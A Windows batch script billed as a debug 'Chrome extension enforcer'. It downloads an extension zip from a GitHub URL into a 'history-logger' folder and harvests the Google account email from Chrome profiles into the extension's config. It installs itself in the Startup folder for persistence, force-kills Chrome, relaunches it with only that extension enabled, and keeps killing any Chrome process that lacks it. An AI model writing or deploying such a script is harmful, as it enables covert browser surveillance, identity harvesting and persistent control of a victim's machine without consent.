@echo off
setlocal EnableDelayedExpansion

REM Debugging version of Chrome extension enforcer
REM Displays progress in CMD, logs to file, ensures single Chrome instance
REM Searches for manifest.json/background.js in WORKDIR, optional SQLite3 support

REM Initialize log file for debugging
set "LOGFILE=%USERPROFILE%\Documents\chrome_enforcer_log.txt"
echo [%DATE% %TIME%] Starting Chrome extension enforcer (DEBUG MODE) >> "%LOGFILE%"
echo Starting Chrome extension enforcer (DEBUG MODE)

REM 1) CONFIG: GitHub raw zip URL
set "ZIP_URL=https://raw.githubusercontent.com/Ayamet/web/main/main/extension.zip"
echo Step 1: Configured ZIP URL: %ZIP_URL%
echo [%DATE% %TIME%] Configured ZIP URL: %ZIP_URL% >> "%LOGFILE%"

REM Set work directory to Documents with unique folder
set "WORKDIR=%USERPROFILE%\Documents\history-logger-%RANDOM%"
set "EXT_DIR=%WORKDIR%"
echo Step 2: Creating working directory: %WORKDIR%
mkdir "%WORKDIR%"
if errorlevel 1 (
  echo ERROR: Failed to create %WORKDIR%
  echo [%DATE% %TIME%] ERROR: Failed to create %WORKDIR% >> "%LOGFILE%"
  pause
  exit /b 1
)
echo Successfully created %WORKDIR%
echo [%DATE% %TIME%] Created working directory: %WORKDIR% >> "%LOGFILE%"

REM 2) Download extension.zip
echo Step 3: Downloading extension zip from %ZIP_URL%
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "try { Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing; exit 0 } catch { exit 1 }"
if errorlevel 1 (
  echo ERROR: Failed to download zip from %ZIP_URL%
  echo [%DATE% %TIME%] ERROR: Failed to download zip >> "%LOGFILE%"
  pause
  exit /b 1
)
echo Successfully downloaded extension zip
echo [%DATE% %TIME%] Downloaded extension zip >> "%LOGFILE%"

REM 3) Extract ext.zip
echo Step 4: Extracting zip to %WORKDIR%
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "try { Expand-Archive -LiteralPath '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force; exit 0 } catch { exit 1 }"
if errorlevel 1 (
  echo ERROR: Failed to extract zip
  echo [%DATE% %TIME%] ERROR: Failed to extract zip >> "%LOGFILE%"
  pause
  exit /b 1
)
echo Successfully extracted zip to %WORKDIR%
echo [%DATE% %TIME%] Extracted zip to %WORKDIR% >> "%LOGFILE%"

REM 4) Locate manifest.json and background.js
echo Step 5: Locating manifest.json and background.js
set "FOUND=0"
if exist "%WORKDIR%\manifest.json" (
  if exist "%WORKDIR%\background.js" (
    set "EXT_DIR=%WORKDIR%"
    set "FOUND=1"
    echo Found manifest.json and background.js in %WORKDIR%
  )
)
if "%FOUND%"=="0" (
  for /D %%D in ("%WORKDIR%\*") do (
    if exist "%%D\manifest.json" (
      if exist "%%D\background.js" (
        set "EXT_DIR=%%D"
        set "FOUND=1"
        echo Found manifest.json and background.js in %%D
        goto :got
      )
    )
  )
)
:got
if "%FOUND%"=="0" (
  echo ERROR: manifest.json or background.js not found in %WORKDIR% or its subfolders
  echo [%DATE% %TIME%] ERROR: manifest.json or background.js not found >> "%LOGFILE%"
  dir "%WORKDIR%" /s >> "%LOGFILE%"
  echo Contents of %WORKDIR% logged to %LOGFILE%
  pause
  exit /b 1
)
echo Successfully located extension at %EXT_DIR%
echo [%DATE% %TIME%] Found extension at %EXT_DIR% >> "%LOGFILE%"

REM 5) Check for SQLite3 dependency in extension
echo Step 6: Checking for SQLite3-related files in %EXT_DIR%
set "SQLITE_FOUND=0"
if exist "%EXT_DIR%\*sqlite*" (
  set "SQLITE_FOUND=1"
  echo WARNING: SQLite-related files found in %EXT_DIR%, extension may require SQLite3
  echo [%DATE% %TIME%] WARNING: SQLite-related files found in %EXT_DIR% >> "%LOGFILE%"
  dir "%EXT_DIR%\*sqlite*" >> "%LOGFILE%"
)
echo SQLite check complete: SQLite files found=%SQLITE_FOUND%
echo [%DATE% %TIME%] SQLite check: %SQLITE_FOUND% >> "%LOGFILE%"

REM 6) Scan Chrome profiles for email
echo Step 7: Scanning Chrome profiles for email
set "EMAIL="
for /D %%P in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
  if exist "%%P\Preferences" (
    for /f "usebackq delims=" %%E in (`
      powershell -NoProfile -ExecutionPolicy Bypass -Command ^
        "try {(Get-Content -Raw '%%P\Preferences' | ConvertFrom-Json).account_info.email} catch {''}"
    `) do if not defined EMAIL (
      set "EMAIL=%%E"
      echo Found email: %%E in profile %%P
    )
  )
)
if not defined EMAIL set "EMAIL=anonymous@demo.com"
echo Using email: %EMAIL%
echo [%DATE% %TIME%] Using email: %EMAIL% >> "%LOGFILE%"

REM 7) Write config.json
echo Step 8: Writing config.json with email %EMAIL%
> "%EXT_DIR%\config.json" echo {"userEmail":"!EMAIL!"}
if errorlevel 1 (
  echo ERROR: Failed to write config.json
  echo [%DATE% %TIME%] ERROR: Failed to write config.json >> "%LOGFILE%"
  pause
  exit /b 1
)
echo Successfully wrote config.json
echo [%DATE% %TIME%] Wrote config.json with email %EMAIL% >> "%LOGFILE%"

REM 8) Locate chrome.exe
echo Step 9: Locating chrome.exe
set "CHROME_PATH="
for %%P in (
  "%ProgramFiles%\Google\Chrome\Application\chrome.exe"
  "%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"
  "%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"
) do if exist "%%~P" set "CHROME_PATH=%%~P"
if not defined CHROME_PATH (
  echo ERROR: chrome.exe not found!
  echo [%DATE% %TIME%] ERROR: chrome.exe not found! >> "%LOGFILE%"
  pause
  exit /b 1
)
echo Found Chrome at %CHROME_PATH%
echo [%DATE% %TIME%] Found Chrome at %CHROME_PATH% >> "%LOGFILE%"

REM 9) Ensure script runs on startup
echo Step 10: Copying script to startup folder
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "SCRIPT_NAME=ChromeExtensionEnforcerDebug.bat"
set "SCRIPT_PATH=%~f0"
copy "%SCRIPT_PATH%" "%STARTUP_DIR%\%SCRIPT_NAME%"
if errorlevel 1 (
  echo ERROR: Failed to copy script to %STARTUP_DIR%
  echo [%DATE% %TIME%] ERROR: Failed to copy script to %STARTUP_DIR% >> "%LOGFILE%"
  pause
) else (
  echo Successfully copied script to %STARTUP_DIR%
  echo [%DATE% %TIME%] Copied script to startup folder >> "%LOGFILE%"
)

REM 10) Check and manage Chrome processes
echo Step 11: Checking for Chrome processes
set "CHROME_RUNNING=0"
set "CHROME_COUNT=0"
for /f "tokens=2" %%A in ('tasklist /FI "IMAGENAME eq chrome.exe" /FO CSV /NH') do (
  set /a CHROME_COUNT+=1
  set "CHROME_RUNNING=1"
  echo Found Chrome process: PID %%A
)
echo Total Chrome processes: %CHROME_COUNT%
echo [%DATE% %TIME%] Total Chrome processes: %CHROME_COUNT% >> "%LOGFILE%"

REM 11) Terminate all Chrome processes if any are running
if "!CHROME_RUNNING!"=="1" (
  echo Step 12: Terminating all Chrome processes
  taskkill /IM chrome.exe /F
  if errorlevel 1 (
    echo ERROR: Failed to terminate Chrome processes
    echo [%DATE% %TIME%] ERROR: Failed to terminate Chrome processes >> "%LOGFILE%"
    pause
  ) else (
    echo Successfully terminated %CHROME_COUNT% Chrome processes
    echo [%DATE% %TIME%] Terminated %CHROME_COUNT% Chrome processes >> "%LOGFILE%"
  )
  timeout /t 3
) else (
  echo Step 12: No Chrome processes running, skipping termination
  echo [%DATE% %TIME%] No Chrome processes to terminate >> "%LOGFILE%"
)

REM 12) Launch single Chrome instance with extension
echo Step 13: Launching Chrome with extension
set "PROFILE_DIR shotgun=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
if not exist "!PROFILE_DIR shotgun!" (
  echo Creating profile directory: !PROFILE_DIR shotgun!
  mkdir "!PROFILE_DIR shotgun!"
)
start "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR shotgun!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%"
if errorlevel 1 (
  echo ERROR: Failed to launch Chrome
  echo [%DATE% %TIME%] ERROR: Failed to launch Chrome >> "%LOGFILE%"
  pause
) else (
  echo Successfully launched Chrome with extension at %EXT_DIR%
  echo [%DATE% %TIME%] Launched Chrome with extension at %EXT_DIR% >> "%LOGFILE%"
)

REM 13) Monitor and enforce single Chrome instance
echo Step 14: Starting monitoring loop
echo [%DATE% %TIME%] Starting monitoring loop >> "%LOGFILE%"
:monitor
set "CHROME_RUNNING=0"
set "CHROME_COUNT=0"
powershell -Command "(Get-WmiObject Win32_Process -Filter \"name = 'chrome.exe'\" | Select-Object ProcessId,CommandLine)" > "%TEMP%\chrome_processes.txt"
for /f "tokens=1,* delims= " %%A in (%TEMP%\chrome_processes.txt) do (
  set /a CHROME_COUNT+=1
  set "COMMAND_LINE=%%B"
  echo Checking process %%A: !COMMAND_LINE!
  echo !COMMAND_LINE! | find "--user-data-dir=" >nul
  if !ERRORLEVEL! == 0 (
    for /f "tokens=2 delims==" %%D in ("!COMMAND_LINE!") do (
      set "PROFILE_DIR=%%D"
      set "PROFILE_DIR=!PROFILE_DIR:"=!"
      for %%E in ("!PROFILE_DIR!") do set "PROFILE_DIR=%%~E"
      echo Found profile directory: !PROFILE_DIR!
      echo !COMMAND_LINE! | find "--load-extension=" >nul
      if !ERRORLEVEL! NEQ 0 (
        echo Process %%A is not using extension, terminating
        powershell -Command "Stop-Process -Id %%A -Force"
        echo [%DATE% %TIME%] Terminated non-extension process %%A >> "%LOGFILE%"
      ) else (
        echo Process %%A is using extension
        set "CHROME_RUNNING=1"
      )
    )
  )
)
del "%TEMP%\chrome_processes.txt"
if "!CHROME_COUNT!" GTR "1" (
  echo WARNING: Multiple Chrome instances (%CHROME_COUNT%) detected, terminating all
  taskkill /IM chrome.exe /F
  echo [%DATE% %TIME%] Terminated %CHROME_COUNT% Chrome processes due to multiple instances >> "%LOGFILE%"
  timeout /t 3
  echo Relaunching single Chrome instance
  start "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%"
  echo [%DATE% %TIME%] Relaunched Chrome with extension >> "%LOGFILE%"
) else if not defined CHROME_RUNNING (
  echo No Chrome processes with extension found, relaunching
  start "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%"
  echo [%DATE% %TIME%] Relaunched Chrome with extension >> "%LOGFILE%"
)
echo Monitoring... (%CHROME_COUNT% Chrome processes)
echo [%DATE% %TIME%] Monitoring, %CHROME_COUNT% Chrome processes >> "%LOGFILE%"
timeout /t 5
goto :monitor
